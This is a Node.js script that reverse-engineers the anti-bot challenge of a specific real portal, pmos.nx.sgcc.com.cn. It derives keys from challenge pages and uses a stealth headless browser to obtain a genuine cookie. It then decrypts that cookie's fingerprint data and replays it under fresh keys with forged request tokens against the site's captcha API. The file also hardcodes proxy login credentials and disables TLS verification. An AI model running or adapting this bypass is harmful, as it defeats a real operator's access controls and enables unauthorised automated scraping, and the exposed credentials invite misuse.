/**
 * 516_pure_basearr_reuse.js
 * 最终验证：basearr 明文 A（浏览器逆向）跨会话复用
 * 1. 拉挑战 A + 浏览器生成 cookie A → 逆向 basearr A（167B）
 * 2. 拉新挑战 B → keys2B/keys17B
 * 3. 构造 nextarr = [4, 8, r2mka, start, 48, keys2B, flag, beLen, beB]
 *    beB = encryptMode1(xor(numarrEncrypt(basearrA), keys2B, 16), numarrAddTime(keys17B, t)[0], 0)
 * 4. cookie = 'a' + numarr2string(encryptMode1([uuid(nextarr), ...nextarr], keys16arr, 1))
 * 5. curl → 若 200：basearr 动态段不严格校验 → 纯算法（固定指纹 + 随机/时间戳填充）
 */
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
process.env.NODE_OPTIONS = '--dns-result-order=ipv4first';
process.env.OPENSSL_LEGACY_RENEGOTIATION = '1';
const fs = require('fs');
const path = require('path');
const http = require('http');
const tls = require('tls');
const { execSync } = require('child_process');
const { chromium } = require(path.join('/Users/luoyy/work/github/GitHub/rs-reverse_kimi/node_modules', 'patchright'));

const ROOT = path.join(__dirname, '..');
const TARGET = 'https://pmos.nx.sgcc.com.cn:10443/';
const UA = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';
const PROXY = 'http://74940609:aFmWc5Fs@36.134.44.6:2018';
const PROXY_URL = new URL(PROXY);
const PROXY_AUTH = 'Basic ' + Buffer.from(PROXY_URL.username + ':' + PROXY_URL.password).toString('base64');
const NX_BS = 'qrcklmDoExthWJiHAp1sVYKU3RFMQw8IGfPO92bvLNj-7zXBaSnu0TC6gy_4Ze5d{}|~ !#$%()*+,.;=?@[]^';
const B86_64 = NX_BS.slice(0, 64).split('');
const K16 = [215, 90, 92, 114, 190, 161, 210, 59, 55, 192, 204, 2, 209, 95, 17, 173];
const MASK = [0x0b, 0x16, 0x00, 0x10, 0x00, 0x31, 0x00, 0x01];

function decodeB86(str) {
  const idxmap = {}; for (let i = 0; i < 64; i++) idxmap[NX_BS[i]] = i;
  const bytes = []; let qi = 0;
  for (let g = 0; g < Math.floor(str.length / 4); g++) {
    const c0 = idxmap[str[qi]], c1 = idxmap[str[qi + 1]], c2 = idxmap[str[qi + 2]], c3 = idxmap[str[qi + 3]];
    if (c0 === undefined) return null;
    qi += 4;
    bytes.push((c0 << 2) | (c1 >> 4), ((c1 & 15) << 4) | (c2 >> 2), ((c2 & 3) << 6) | c3);
  }
  const rem = str.length - qi;
  if (rem === 2) { const c0 = idxmap[str[qi]], c1 = idxmap[str[qi + 1]]; if (c0 === undefined) return null; bytes.push((c0 << 2) | (c1 >> 4)); }
  else if (rem === 3) { const c0 = idxmap[str[qi]], c1 = idxmap[str[qi + 1]], c2 = idxmap[str[qi + 2]]; if (c0 === undefined) return null; bytes.push((c0 << 2) | (c1 >> 4), ((c1 & 15) << 4) | (c2 >> 2)); }
  return bytes;
}
function numarr2string(numarr, b64) {
  let str = '';
  for (let i = 0; i < numarr.length; i += 3) {
    const a = numarr[i], b = numarr[i + 1], c = numarr[i + 2];
    const t = (a << 16) | (b << 8) | c;
    str += b64[(t >> 18) & 63] + b64[(t >> 12) & 63] + b64[(t >> 6) & 63] + b64[t & 63];
  }
  return str;
}
function crc32b(buf) {
  let c = 0xffffffff;
  for (const b of buf) { c ^= b; for (let i = 0; i < 8; i++) c = (c >>> 1) ^ (0xedb88320 & -(c & 1)); }
  return (c ^ 0xffffffff) >>> 0;
}
function httpsGet(url) {
  return new Promise((resolve) => {
    const u = new URL(url);
    const connectReq = http.request({
      host: PROXY_URL.hostname, port: +PROXY_URL.port, method: 'CONNECT',
      path: `${u.hostname}:${u.port || 443}`,
      headers: { 'Proxy-Authorization': PROXY_AUTH, Host: `${u.hostname}:${u.port || 443}` },
      timeout: 25000,
    });
    connectReq.on('connect', (res, socket) => {
      if (res.statusCode !== 200) { socket.destroy(); resolve({ status: 'ERR' }); return; }
      const tlsSock = tls.connect({ socket, servername: u.hostname, rejectUnauthorized: false }, () => {
        tlsSock.write(`GET ${u.pathname + u.search} HTTP/1.1\r\nHost: ${u.hostname}:${u.port || 443}\r\nUser-Agent: ${UA}\r\nAccept: */*\r\nConnection: close\r\n\r\n`);
      });
      let body = '', raw = '';
      tlsSock.on('data', d => raw += d);
      tlsSock.on('end', () => {
        const headEnd = raw.indexOf('\r\n\r\n');
        if (headEnd >= 0) {
          const resHead = raw.substring(0, headEnd);
          const setCookies = [];
          resHead.split('\r\n').forEach(l => { if (/^set-cookie:/i.test(l)) setCookies.push(l.substring(11).split(';')[0]); });
          resolve({ status: parseInt((resHead.split(' ')[1] || '').trim()), body: raw.substring(headEnd + 4), setCookies });
        } else resolve({ status: 'ERR' });
      });
      tlsSock.on('error', e => resolve({ status: 'ERR' }));
    });
    connectReq.on('error', e => resolve({ status: 'ERR' }));
    connectReq.on('timeout', () => { connectReq.destroy(); resolve({ status: 'TIMEOUT' }); });
    connectReq.end();
  });
}
function getTree() {
  let arr = [];
  for (let i = 1; i < 255; i++) arr.push({ total: 1, idx: i });
  arr.push({ total: 6, idx: 255 }, { total: 45, idx: 0 });
  function parse(item) {
    for (let i = 0; i < arr.length; i++) { if (item.total <= arr[i].total) { arr.splice(i, 0, item); return; } }
    arr.push(item);
  }
  while (arr.length > 1) {
    const [one, two] = arr.slice(0, 2);
    arr = arr.slice(2);
    parse({ total: one.total + two.total, first: one, second: two });
  }
  return arr[0];
}
function getEncryptConfig(tree, config = { key: 0, val: 0 }, arr = []) {
  if (tree.idx === undefined) {
    getEncryptConfig(tree.first, { key: config.key << 1, val: config.val + 1 }, arr);
    getEncryptConfig(tree.second, { key: (config.key << 1) + 1, val: config.val + 1 }, arr);
  } else arr[tree.idx] = config;
  return arr;
}
let encCfg = null, byLenMap = null, maxCodeLen = 0;
function initHuff() {
  if (encCfg) return;
  encCfg = getEncryptConfig(getTree());
  byLenMap = {};
  for (let idx = 0; idx < 256; idx++) {
    const c = encCfg[idx];
    if (!c) continue;
    if (!byLenMap[c.val]) byLenMap[c.val] = {};
    byLenMap[c.val][c.key] = idx;
    if (c.val > maxCodeLen) maxCodeLen = c.val;
  }
}
function huffmanDecode(enc) {
  initHuff();
  const ans = [];
  let key = 0, val = 0;
  for (let i = 0; i < enc.length; i++) {
    for (let b = 7; b >= 0; b--) {
      key = (key << 1) | ((enc[i] >> b) & 1);
      val++;
      const m = byLenMap[val];
      if (m && m[key] !== undefined) { ans.push(m[key]); key = 0; val = 0; }
      if (val > maxCodeLen) { key = 0; val = 0; }
    }
  }
  return ans;
}
function deriveKeysFromCd(cd) {
  function makeDecryptKeys(bs) {
    return bs.split('').reduce((ans, key, idx) => {
      const code = key.charCodeAt();
      ans[0][code] = idx << 2; ans[1][code] = idx >> 4;
      ans[2][code] = (idx & 15) << 4; ans[3][code] = idx >> 2;
      ans[4][code] = (idx & 3) << 6; ans[5][code] = idx;
      return ans;
    }, [{}, {}, {}, {}, {}, { ...new Array(255 + 1).fill(-1) }]);
  }
  function decryptCd(cd) {
    const dk = makeDecryptKeys(NX_BS);
    const [d1, d2, d3, d4, d5, d6] = dk;
    const arr2 = [];
    for (let i = 0; i < cd.length; i += 4) {
      const one = cd[i].charCodeAt();
      const two = i + 1 < cd.length ? cd[i + 1].charCodeAt() : undefined;
      const three = i + 2 < cd.length ? cd[i + 2].charCodeAt() : undefined;
      const four = i + 3 < cd.length ? cd[i + 3].charCodeAt() : undefined;
      two !== undefined && arr2.push(d1[one] | d2[two]);
      three !== undefined && arr2.push(d3[two] | d4[three]);
      four !== undefined && arr2.push(d5[three] | d6[four]);
    }
    return arr2;
  }
  function deriveKeys(cdArr) {
    const end = (cdArr[0] << 8 | cdArr[1]) + 2;
    const tail = cdArr.slice(end);
    function getLensGo(numarr, idx) {
      const item = numarr[idx]; idx++;
      let lens;
      if ((item & 128) === 0) lens = item;
      else if ((item & 192) === 128) { lens = ((item & 63) << 8) | numarr[idx]; idx++; }
      else if ((item & 224) === 192) { lens = ((item & 31) << 16) | (numarr[idx] << 8) | numarr[idx + 1]; idx += 2; }
      else if ((item & 240) === 224) { lens = ((item & 15) << 24) | (numarr[idx] << 16) | (numarr[idx + 1] << 8) | numarr[idx + 2]; idx += 3; }
      else if ((item & 248) === 240) { lens = (numarr[idx] << 24) | (numarr[idx + 1] << 16) | (numarr[idx + 2] << 8) | numarr[idx + 3]; idx += 4; }
      else lens = item;
      return [lens, idx];
    }
    for (let k0 = 0; k0 <= 127; k0++) {
      for (let k1 = 0; k1 <= 127; k1++) {
        const off = [tail[0] ^ 51, tail[1] ^ 2, tail[2] ^ k0, tail[3] ^ k1, tail[4] ^ 2, tail[5] ^ k0, tail[6] ^ k1, tail[7] ^ 48];
        const ans = tail.map((b, i) => b ^ off[i % 8]);
        if (ans[0] !== 51 || ans[1] !== 2 || ans[4] !== 2 || ans[7] !== 48) continue;
        if (ans.some(v => v > 255)) continue;
        const keys = [];
        let op = 1, gap, ok = true;
        for (let i = 0; i < ans[0]; i++) {
          [gap, op] = getLensGo(ans, op);
          if (gap < 0 || op + gap > ans.length) { ok = false; break; }
          keys.push(ans.slice(op, op + gap));
          op += gap;
        }
        if (!ok) continue;
        const k16 = keys[16];
        if (k16 && k16.length === 16 && k16.every((v, i) => v === K16[i])) return { off, keys };
      }
    }
    return null;
  }
  return deriveKeys(decryptCd(cd));
}
function runCurl(apiUrl, hdrQ, cookieStr, label) {
  const curlCmd = `curl -s -o /tmp/516_api.html -w "%{http_code}" -x "${PROXY}" --max-time 20 '${apiUrl}' \
-H 'Accept: application/json, text/plain, */*' \
-H 'ClientTag: OUTNET_BROWSE' \
-H 'Content-Type: application/json;charset=UTF-8' \
-H 'CurrentRoute: /outNet' \
-H 'MurR7rxG: ${hdrQ}' \
-H 'Origin: https://pmos.nx.sgcc.com.cn:10443' \
-H 'Referer: ${TARGET}' \
-H 'User-Agent: ${UA}' \
-H 'X-Ticket: undefined' \
-H 'X-Token: null' \
-b '${cookieStr}' \
--data-raw '{"captchaType":"blockPuzzle"}'`;
  try {
    const code = execSync(curlCmd, { timeout: 30000 }).toString().trim();
    const body = fs.readFileSync('/tmp/516_api.html', 'utf8');
    console.log(label + ':', code, body.substring(0, 80).replace(/\n/g, ' '));
  } catch (e) {
    console.log(label + ': err', (e.stdout || '').toString().trim());
  }
}

(async () => {
  const chA = await httpsGet(TARGET);
  const chB = await httpsGet(TARGET);
  if (chA.status !== 412 || chB.status !== 412) { console.log('挑战失败', chA.status, chB.status); process.exit(1); }
  const mA = chA.body.match(/\$_ts\.nsd=(\d+);\$_ts\.cd="([^"]+)"/);
  const mB = chB.body.match(/\$_ts\.nsd=(\d+);\$_ts\.cd="([^"]+)"/);
  if (!mA || !mB) { console.log('nsd 解析失败'); process.exit(1); }
  const tsA = { nsd: +mA[1], cd: mA[2] };
  const tsB = { nsd: +mB[1], cd: mB[2] };
  const oCookie = chB.setCookies.find(c => /O=/.test(c)) || '';
  console.log('挑战A nsd=' + tsA.nsd + ' 挑战B nsd=' + tsB.nsd);

  try { require('module-alias')(path.dirname(require(path.join(ROOT, 'utils/paths.js')).package)); } catch (e) {}
  require(path.join(ROOT, 'src/handler/parser/constData')).init();
  const { encryptMode1, encryptMode2 } = require(path.join(ROOT, 'src/handler/parser/common/modeEncrypt'));
  const numarrAddTime = require(path.join(ROOT, 'src/handler/parser/common/numarrAddTime'));
  const numarrEncrypt = require(path.join(ROOT, 'src/handler/parser/common/numarrEncrypt'));
  const numarrJoin = require(path.join(ROOT, 'src/handler/parser/common/numarrJoin'));
  const numToNumarr4 = require(path.join(ROOT, 'src/handler/parser/common/numToNumarr4'));
  const uuidFn = require(path.join(ROOT, 'src/handler/parser/common/uuid'));
  const xor = require(path.join(ROOT, 'src/handler/parser/common/tools')).xor;

  const derA = deriveKeysFromCd(tsA.cd);
  const derB = deriveKeysFromCd(tsB.cd);
  const keys16arr = numarrAddTime([...K16], 0, 1 / 256)[0];

  // 1. 浏览器生成 cookie A → 逆向 basearr A
  const browser = await chromium.launch({ headless: true, proxy: { server: 'http://36.134.44.6:2018', username: '74940609', password: 'aFmWc5Fs' }, args: ['--ignore-certificate-errors', '--no-sandbox'] });
  const context = await browser.newContext({ ignoreHTTPSErrors: true, userAgent: UA });
  const page = await context.newPage();
  await page.route('**/pmos.nx.sgcc.com.cn:10443/', (route) => { route.fulfill({ status: 412, contentType: 'text/html', body: chA.body }); });
  try { await page.goto(TARGET, { timeout: 60000, waitUntil: 'domcontentloaded' }); } catch (e) {}
  await page.waitForTimeout(9000);
  const ck = await context.cookies();
  const pA = ck.find(c => c.name.endsWith('P'));
  const pName = pA.name;
  await browser.close();
  if (!pA) { console.log('无 P cookie'); process.exit(1); }

  // 逆向 basearr A 的 numarrEncrypt 结果（huffA，绕过 huffman 解码）
  const decA = encryptMode2([...decodeB86(pA.value.slice(1))], keys16arr, 1);
  const naA = decA.slice(4);
  const beLenA = naA[60];
  const beA = naA.slice(61, 61 + beLenA);
  const tmpA = encryptMode2([...beA], numarrAddTime([...derA.keys[17]], 0, 1 / 256)[0], 0);
  const huffA = tmpA.map((v, i) => i < 16 ? (v ^ derA.keys[2][i]) : v); // numarrEncrypt(basearrA) 完整
  console.log('huffA len:', huffA.length, '前25:', huffA.slice(0, 25).map(b => b.toString(16).padStart(2, '0')).join(' '));
  console.log('browser A P len:', pA.value.length);

  // 2. 用 huffA（basearr 编码）+ 挑战 B keys 构造 nextarr
  const keys2B = derB.keys[2];
  const keys17B = derB.keys[17];
  // basearrEncrypt（用挑战 B 的 keys2/keys17 + 新时间）
  const runTime = Math.floor(Date.now() / 1000);
  const random = Math.random();
  const huffNew = [...huffA]; // basearr 不变 → numarrEncrypt 不变
  const xorNew = [...huffNew];
  xor(xorNew, keys2B, 16);
  const beB = encryptMode1(xorNew, numarrAddTime([...keys17B], runTime, random)[0], 0);
  console.log('beB len:', beB.length);
  // nextarr = [4, 8, r2mka, start, 48, keys2B, flag, beLen, ...beB]
  // 真实结构（513 号验证）：numarrJoin(4, numToNumarr4([r2mka,start]), keys2) → [4,8,r2mka,start,48,keys2]
  const r2mkaT = runTime;
  const startT = runTime;
  const nextarr = numarrJoin(
    numarrJoin(4, numToNumarr4([r2mkaT, startT]), keys2B),
    beB.length >> 8 & 255 | 128,
    beB
  );
  console.log('nextarr len:', nextarr.length, 'head:', nextarr.slice(0, 10).map(b => b.toString(16).padStart(2, '0')).join(' '));
  // cookie = 'a' + numarr2string(encryptMode1([uuid(nextarr), ...nextarr], keys16arr, 1))
  const u4 = numToNumarr4(uuidFn(nextarr));
  const final = encryptMode1([...u4, ...nextarr], keys16arr, 1);
  const cookieB = 'a' + numarr2string(final, B86_64);
  console.log('构造 cookie len:', cookieB.length);

  // 3. curl（挑战 B 的 keys 做 query）
  const k2 = keys2B;
  const randByte = () => Math.floor(Math.random() * 256);
  function genQuery(urlPath) {
    const cu = crc32b(Buffer.from(urlPath.toUpperCase()));
    const plain24 = [
      k2[0] ^ MASK[0], k2[1] ^ MASK[1], k2[2] ^ MASK[2], k2[3] ^ MASK[3],
      k2[4] ^ MASK[4], k2[5] ^ MASK[5], k2[6] ^ MASK[6], k2[7] ^ MASK[7],
      randByte(), randByte(), randByte(), randByte(), randByte(),
      randByte(), randByte(), randByte(), 0xb7, randByte(), randByte(), randByte(),
      (cu >>> 24) & 255, (cu >>> 16) & 255, (cu >>> 8) & 255, cu & 255,
    ];
    const [key21] = numarrAddTime([...keys17B], Math.floor(Date.now() / 1000), Math.random());
    const requestData = encryptMode1(plain24, key21, 0);
    const body = [4, 0, 48, ...k2, 32, ...requestData];
    const crc = crc32b(Buffer.from(body));
    return 'a' + numarr2string([(crc >>> 24) & 255, (crc >>> 16) & 255, (crc >>> 8) & 255, crc & 255, ...body], B86_64);
  }
  const API = '/px-common-authcenter/auth/v2/captcha/get';
  const urlQ = genQuery(API);
  const hdrQ = genQuery(API);
  const API_URL = 'https://pmos.nx.sgcc.com.cn:10443' + API + '?' + urlQ;

  runCurl(API_URL, hdrQ, oCookie + '; ' + pName + '=' + cookieB, '★ 构造 cookie (basearrA+keysB)');
  process.exit(0);
})().catch(e => { console.error('FATAL:', e.message, e.stack); process.exit(1); });
